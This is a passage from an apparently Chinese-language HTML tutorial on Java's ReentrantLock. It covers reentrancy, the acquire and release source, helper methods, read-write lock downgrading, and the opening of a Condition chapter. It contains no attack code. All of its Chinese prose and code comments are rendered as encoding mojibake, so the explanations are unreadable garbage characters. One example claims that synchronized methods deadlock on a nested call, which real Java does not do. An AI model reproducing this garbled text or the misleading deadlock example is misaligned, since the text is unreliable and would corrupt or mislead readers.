<p>å¯é‡å…¥ï¼ˆReentrantï¼‰æ˜¯æŒ‡åŒä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤šæ¬¡è·å–åŒä¸€æŠŠé”ï¼Œè€Œä¸ä¼šé€ æˆæ­»é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å¯é‡å…¥æ¼”ç¤º
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantDemo</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡è·å–ï¼Œstate = 1</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"methodA"</span>);
            methodB();  <span class="hljs-comment">// è°ƒç”¨methodBï¼Œå†æ¬¡è·å–é”</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// state = 0</span>
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
        lock.lock();  <span class="hljs-comment">// ç¬¬äºŒæ¬¡è·å–ï¼Œstate = 2ï¼ˆé‡å…¥ï¼ï¼‰</span>
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"methodB"</span>);
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();  <span class="hljs-comment">// state = 1</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-93">6.2 é‡å…¥å®ç°åŸç†</h4>
<p><strong>è·å–é”æ—¶çš„é‡å…¥åˆ¤æ–­</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// é”ç©ºé—²ï¼Œé¦–æ¬¡è·å–</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
            setExclusiveOwnerThread(current);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    <span class="hljs-comment">// é‡å…¥åˆ¤æ–­ï¼šå½“å‰çº¿ç¨‹æ˜¯å¦æ˜¯é”æŒæœ‰è€…</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
        <span class="hljs-comment">// æ˜¯ï¼Œstateç´¯åŠ </span>
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
        <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(nextc);  <span class="hljs-comment">// æ— éœ€CASï¼Œå› ä¸ºæ˜¯ç‹¬å çš„</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>é‡Šæ”¾é”æ—¶çš„é‡å…¥å¤„ç†</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;  <span class="hljs-comment">// stateå‡1</span>
    
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-comment">// åªæœ‰stateå‡åˆ°0æ‰çœŸæ­£é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        free = <span class="hljs-literal">true</span>;
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    }
    setState(c);
    <span class="hljs-keyword">return</span> free;  <span class="hljs-comment">// è¿”å›æ˜¯å¦å®Œå…¨é‡Šæ”¾</span>
}
</code></pre>
<h4 data-id="heading-94">6.3 é‡å…¥è¿‡ç¨‹å›¾è§£</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as çº¿ç¨‹
    participant Lock as ReentrantLock
    
    Note over Lock: state=0, owner=null
    
    T-&gt;&gt;Lock: lock() [ç¬¬1æ¬¡]
    Lock-&gt;&gt;Lock: state: 0â†’1, owner=T
    Note over Lock: state=1, owner=T
    
    T-&gt;&gt;Lock: lock() [ç¬¬2æ¬¡ï¼Œé‡å…¥]
    Lock-&gt;&gt;Lock: state: 1â†’2
    Note over Lock: state=2, owner=T
    
    T-&gt;&gt;Lock: lock() [ç¬¬3æ¬¡ï¼Œé‡å…¥]
    Lock-&gt;&gt;Lock: state: 2â†’3
    Note over Lock: state=3, owner=T
    
    T-&gt;&gt;Lock: unlock()
    Lock-&gt;&gt;Lock: state: 3â†’2
    Note over Lock: state=2, owner=T
    
    T-&gt;&gt;Lock: unlock()
    Lock-&gt;&gt;Lock: state: 2â†’1
    Note over Lock: state=1, owner=T
    
    T-&gt;&gt;Lock: unlock()
    Lock-&gt;&gt;Lock: state: 1â†’0, owner=null
    Note over Lock: state=0, owner=null&lt;br/&gt;é”å®Œå…¨é‡Šæ”¾
</code></pre>
<h4 data-id="heading-95">6.4 ä¸ºä»€ä¹ˆéœ€è¦å¯é‡å…¥</h4>
<p>å¦‚æœé”ä¸æ”¯æŒé‡å…¥ï¼Œä¼šå‘ç”Ÿæ­»é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å‡è®¾é”ä¸å¯é‡å…¥
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonReentrantProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"methodA"</span>);
        methodB();  <span class="hljs-comment">// æ­»é”ï¼å½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼Œæ— æ³•å†æ¬¡è·å–</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
        System.out.println(<span class="hljs-string">"methodB"</span>);
    }
}
</code></pre>
<p><strong>å¯é‡å…¥çš„æ„ä¹‰</strong>ï¼š</p>
<ol>
<li>æ”¯æŒé€’å½’è°ƒç”¨</li>
<li>æ”¯æŒåŒæ­¥æ–¹æ³•ç›¸äº’è°ƒç”¨</li>
<li>ç®€åŒ–ç¼–ç¨‹æ¨¡å‹ï¼Œé¿å…æ„å¤–æ­»é”</li>
</ol>
<h4 data-id="heading-96">6.5 æœ€å¤§é‡å…¥æ¬¡æ•°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
<span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)  <span class="hljs-comment">// overflow</span>
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
</code></pre>
<p>ç”±äº<code>state</code>æ˜¯intç±»å‹ï¼Œæœ€å¤§é‡å…¥æ¬¡æ•°çº¦ä¸º<code>Integer.MAX_VALUE</code>ï¼ˆçº¦21äº¿ï¼‰ã€‚å®é™…ä½¿ç”¨ä¸­åŸºæœ¬ä¸å¯èƒ½è¾¾åˆ°è¿™ä¸ªé™åˆ¶ã€‚</p>
<hr/>
<h3 data-id="heading-97">7. è¾…åŠ©æ–¹æ³•æºç åˆ†æ</h3>
<h4 data-id="heading-98">7.1 getHoldCount - è·å–é‡å…¥æ¬¡æ•°</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è·å–å½“å‰çº¿ç¨‹æŒæœ‰é”çš„æ¬¡æ•°
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.getHoldCount();
}

<span class="hljs-comment">// Sync.getHoldCount</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> isHeldExclusively() ? getState() : <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šè°ƒè¯•å’Œæµ‹è¯•</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">debugMethod</span><span class="hljs-params">()</span> {
    lock.lock();
    <span class="hljs-keyword">try</span> {
        System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + lock.getHoldCount());  <span class="hljs-comment">// 1</span>
        
        lock.lock();
        <span class="hljs-keyword">try</span> {
            System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + lock.getHoldCount());  <span class="hljs-comment">// 2</span>
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
        
        System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + lock.getHoldCount());  <span class="hljs-comment">// 1</span>
    } <span class="hljs-keyword">finally</span> {
        lock.unlock();
    }
}
</code></pre>
<h4 data-id="heading-99">7.2 isHeldByCurrentThread - å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldByCurrentThread</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.isHeldExclusively();
}

<span class="hljs-comment">// Sync.isHeldExclusively</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getExclusiveOwnerThread() == Thread.currentThread();
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šæ–­è¨€æ£€æŸ¥</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">criticalSection</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// ç¡®ä¿è¿›å…¥ä¸´ç•ŒåŒºæ—¶æŒæœ‰é”</span>
    <span class="hljs-keyword">assert</span> lock.isHeldByCurrentThread();
    
    <span class="hljs-comment">// ä¸´ç•ŒåŒºä»£ç ...</span>
}
</code></pre>
<h4 data-id="heading-100">7.3 isLocked - é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.isLocked();
}

<span class="hljs-comment">// Sync.isLocked</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() != <span class="hljs-number">0</span>;
}
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼šè¿™ä¸ªæ–¹æ³•è¿”å›çš„æ˜¯"å¿«ç…§"ï¼Œè¿”å›åçŠ¶æ€å¯èƒ½å·²ç»æ”¹å˜ã€‚ä¸»è¦ç”¨äºç›‘æ§ã€‚</p>
<h4 data-id="heading-101">7.4 getOwner - è·å–é”æŒæœ‰è€…</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è·å–é”çš„æŒæœ‰çº¿ç¨‹
 * <span class="hljs-doctag">@return</span> æŒæœ‰çº¿ç¨‹ï¼Œå¦‚æœæœªé”å®šåˆ™è¿”å›null
 */</span>
<span class="hljs-keyword">protected</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.getOwner();
}

<span class="hljs-comment">// Sync.getOwner</span>
<span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() == <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : getExclusiveOwnerThread();
}
</code></pre>
<p><strong>æ³¨æ„</strong>ï¼šè¿™æ˜¯protectedæ–¹æ³•ï¼Œä¸»è¦ä¾›å­ç±»ä½¿ç”¨ã€‚</p>
<h4 data-id="heading-102">7.5 hasQueuedThreads/getQueueLength - é˜Ÿåˆ—ç›¸å…³æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * æŸ¥è¯¢æ˜¯å¦æœ‰çº¿ç¨‹åœ¨ç­‰å¾…è·å–é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">hasQueuedThreads</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.hasQueuedThreads();
}

<span class="hljs-comment">/**
 * è·å–ç­‰å¾…é˜Ÿåˆ—çš„é•¿åº¦ä¼°è®¡å€¼
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getQueueLength</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync.getQueueLength();
}
</code></pre>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>ï¼šç›‘æ§å’Œè°ƒä¼˜</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">monitorLock</span><span class="hljs-params">()</span> {
    System.out.println(<span class="hljs-string">"æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹: "</span> + lock.hasQueuedThreads());
    System.out.println(<span class="hljs-string">"ç­‰å¾…é˜Ÿåˆ—é•¿åº¦: "</span> + lock.getQueueLength());
}
</code></pre>
<h4 data-id="heading-103">7.6 isFair - æ˜¯å¦ä¸ºå…¬å¹³é”</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * åˆ¤æ–­æ˜¯å¦ä¸ºå…¬å¹³é”
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isFair</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> sync <span class="hljs-keyword">instanceof</span> FairSync;
}
</code></pre>
<h3 data-id="heading-104">8. ReentrantLock vs ReentrantReadWriteLock</h3>
<h4 data-id="heading-105">8.1 æ ¸å¿ƒåŒºåˆ«</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLock vs ReentrantReadWriteLock
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockComparison</span> {
    
    <span class="hljs-comment">// ReentrantLockï¼šäº’æ–¥é”ï¼Œä»»ä½•æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è®¿é—®</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">mutexLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-comment">// ReentrantReadWriteLockï¼šè¯»å†™é”ï¼Œè¯»æ“ä½œå¯å¹¶å‘</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();
    
    <span class="hljs-keyword">private</span> Object data;
    
    <span class="hljs-comment">// ä½¿ç”¨äº’æ–¥é”ï¼šè¯»å†™éƒ½äº’æ–¥</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readWithMutex</span><span class="hljs-params">()</span> {
        mutexLock.lock();  <span class="hljs-comment">// å³ä½¿æ˜¯è¯»æ“ä½œä¹Ÿè¦ç‹¬å </span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> data;
        } <span class="hljs-keyword">finally</span> {
            mutexLock.unlock();
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨è¯»å†™é”ï¼šè¯»æ“ä½œå¯å¹¶å‘</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">readWithRwLock</span><span class="hljs-params">()</span> {
        readLock.lock();  <span class="hljs-comment">// å¤šä¸ªè¯»çº¿ç¨‹å¯ä»¥åŒæ—¶æŒæœ‰è¯»é”</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> data;
        } <span class="hljs-keyword">finally</span> {
            readLock.unlock();
        }
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeWithRwLock</span><span class="hljs-params">(Object newData)</span> {
        writeLock.lock();  <span class="hljs-comment">// å†™é”æ˜¯ç‹¬å çš„</span>
        <span class="hljs-keyword">try</span> {
            data = newData;
        } <span class="hljs-keyword">finally</span> {
            writeLock.unlock();
        }
    }
}
</code></pre>
<h4 data-id="heading-106">8.2 é”é™çº§</h4>
<p><strong>ReentrantLockä¸æ”¯æŒé”é™çº§</strong>ï¼Œè€Œ<strong>ReentrantReadWriteLockæ”¯æŒ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * é”é™çº§ï¼šå†™é” -&gt; è¯»é”
 * åªæœ‰ReadWriteLockæ”¯æŒï¼ŒReentrantLockä¸æ”¯æŒ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockDowngrade</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantReadWriteLock</span> <span class="hljs-variable">rwLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantReadWriteLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">readLock</span> <span class="hljs-operator">=</span> rwLock.readLock();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Lock</span> <span class="hljs-variable">writeLock</span> <span class="hljs-operator">=</span> rwLock.writeLock();
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">cacheValid</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> Object cachedData;
    
    <span class="hljs-comment">/**
     * é”é™çº§ç¤ºä¾‹
     */</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">processData</span><span class="hljs-params">()</span> {
        readLock.lock();  <span class="hljs-comment">// å…ˆè·å–è¯»é”</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (!cacheValid) {
                <span class="hljs-comment">// ç¼“å­˜æ— æ•ˆï¼Œéœ€è¦å†™å…¥</span>
                readLock.unlock();  <span class="hljs-comment">// å¿…é¡»å…ˆé‡Šæ”¾è¯»é”</span>
                writeLock.lock();   <span class="hljs-comment">// å†è·å–å†™é”</span>
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// åŒé‡æ£€æŸ¥</span>
                    <span class="hljs-keyword">if</span> (!cacheValid) {
                        cachedData = loadFromDB();
                        cacheValid = <span class="hljs-literal">true</span>;
                    }
                    <span class="hljs-comment">// ã€é”é™çº§ã€‘åœ¨é‡Šæ”¾å†™é”å‰è·å–è¯»é”</span>
                    readLock.lock();
                } <span class="hljs-keyword">finally</span> {
                    writeLock.unlock();  <span class="hljs-comment">// é‡Šæ”¾å†™é”ï¼Œä»æŒæœ‰è¯»é”</span>
                }
            }
            <span class="hljs-comment">// æ­¤æ—¶æŒæœ‰è¯»é”ï¼Œå¯ä»¥å®‰å…¨è¯»å–</span>
            <span class="hljs-keyword">return</span> cachedData;
        } <span class="hljs-keyword">finally</span> {
            readLock.unlock();
        }
    }
    
    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">loadFromDB</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>(); }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦é”é™çº§ï¼Ÿ</strong></p>
<ul>
<li>åœ¨æ›´æ–°æ•°æ®åï¼Œä»éœ€è¦ä½¿ç”¨è¯¥æ•°æ®</li>
<li>å¦‚æœç›´æ¥é‡Šæ”¾å†™é”ï¼Œå…¶ä»–çº¿ç¨‹å¯èƒ½ä¿®æ”¹æ•°æ®</li>
<li>é”é™çº§ä¿è¯äº†æ•°æ®çš„ä¸€è‡´æ€§</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆReentrantLockä¸éœ€è¦é”é™çº§ï¼Ÿ</strong></p>
<ul>
<li>ReentrantLockåªæœ‰ä¸€ç§é”ï¼Œæ²¡æœ‰è¯»å†™ä¹‹åˆ†</li>
<li>å¯é‡å…¥ç‰¹æ€§å·²ç»æ»¡è¶³äº†ç±»ä¼¼éœ€æ±‚</li>
</ul>
<h3 data-id="heading-107">9. é”æµ‹è¯•æ–¹æ³•è¯¦è§£</h3>
<h4 data-id="heading-108">9.1 ReentrantLockæä¾›çš„æµ‹è¯•æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * ReentrantLockçš„é”æµ‹è¯•æ–¹æ³•
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LockTestMethods</span> {
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">demonstrateTestMethods</span><span class="hljs-params">()</span> {
        
        <span class="hljs-comment">// 1. isLocked() - é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">locked</span> <span class="hljs-operator">=</span> lock.isLocked();
        System.out.println(<span class="hljs-string">"é”æ˜¯å¦è¢«æŒæœ‰: "</span> + locked);
        
        <span class="hljs-comment">// 2. isHeldByCurrentThread() - å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">heldByMe</span> <span class="hljs-operator">=</span> lock.isHeldByCurrentThread();
        System.out.println(<span class="hljs-string">"å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰: "</span> + heldByMe);
        
        <span class="hljs-comment">// 3. getHoldCount() - å½“å‰çº¿ç¨‹çš„é‡å…¥æ¬¡æ•°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">holdCount</span> <span class="hljs-operator">=</span> lock.getHoldCount();
        System.out.println(<span class="hljs-string">"é‡å…¥æ¬¡æ•°: "</span> + holdCount);
        
        <span class="hljs-comment">// 4. hasQueuedThreads() - æ˜¯å¦æœ‰çº¿ç¨‹åœ¨ç­‰å¾…è·å–é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">hasWaiters</span> <span class="hljs-operator">=</span> lock.hasQueuedThreads();
        System.out.println(<span class="hljs-string">"æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹: "</span> + hasWaiters);
        
        <span class="hljs-comment">// 5. getQueueLength() - ç­‰å¾…è·å–é”çš„çº¿ç¨‹æ•°ï¼ˆä¼°è®¡å€¼ï¼‰</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">queueLength</span> <span class="hljs-operator">=</span> lock.getQueueLength();
        System.out.println(<span class="hljs-string">"ç­‰å¾…çº¿ç¨‹æ•°: "</span> + queueLength);
        
        <span class="hljs-comment">// 6. isFair() - æ˜¯å¦ä¸ºå…¬å¹³é”</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">fair</span> <span class="hljs-operator">=</span> lock.isFair();
        System.out.println(<span class="hljs-string">"æ˜¯å¦å…¬å¹³é”: "</span> + fair);
        
        <span class="hljs-comment">// 7. getOwner() - è·å–æŒæœ‰é”çš„çº¿ç¨‹ï¼ˆprotectedæ–¹æ³•ï¼Œéœ€è¦å­ç±»è®¿é—®ï¼‰</span>
        <span class="hljs-comment">// Thread owner = lock.getOwner();  // éœ€è¦ç»§æ‰¿ReentrantLock</span>
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šå®‰å…¨åœ°é‡Šæ”¾é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">safeUnlock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åªæœ‰æŒæœ‰é”çš„çº¿ç¨‹æ‰èƒ½é‡Šæ”¾</span>
        <span class="hljs-keyword">if</span> (lock.isHeldByCurrentThread()) {
            lock.unlock();
        }
    }
    
    <span class="hljs-comment">/**
     * å®é™…åº”ç”¨ï¼šæ£€æŸ¥æ­»é”é£é™©
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">checkDeadlockRisk</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (lock.isLocked() &amp;&amp; !lock.isHeldByCurrentThread()) {
            System.out.println(<span class="hljs-string">"è­¦å‘Šï¼šé”è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰ï¼Œå¯èƒ½é€ æˆç­‰å¾…"</span>);
        }
    }
}
</code></pre>
<h2 data-id="heading-109">ç¬¬å››ç« ï¼šCondition æ¡ä»¶å˜é‡è¯¦è§£</h2>
<h3 data-id="heading-110">1. Conditionæ¥å£æ¦‚è¿°</h3>
<h4 data-id="heading-111">1.1 ä»€ä¹ˆæ˜¯Condition</h4>
<p><code>Condition</code>æ˜¯JDK 1.5å¼•å…¥çš„æ¡ä»¶å˜é‡æ¥å£ï¼Œç”¨äºå®ç°çº¿ç¨‹é—´çš„ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚å®ƒå¿…é¡»ä¸<code>Lock</code>é…åˆä½¿ç”¨ï¼Œæä¾›äº†æ¯”<code>Object.wait/notify</code>æ›´å¼ºå¤§ã€æ›´çµæ´»çš„åŠŸèƒ½ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Condition</span> {
    
    <span class="hljs-comment">/** ç­‰å¾…ï¼Œå“åº”ä¸­æ–­ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">await</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException;
    
    <span class="hljs-comment">/** ç­‰å¾…ï¼Œä¸å“åº”ä¸­æ–­ */</span>
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">awaitUninterruptibly</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">/** ç­‰å¾…æŒ‡å®šçº³ç§’ */</span>
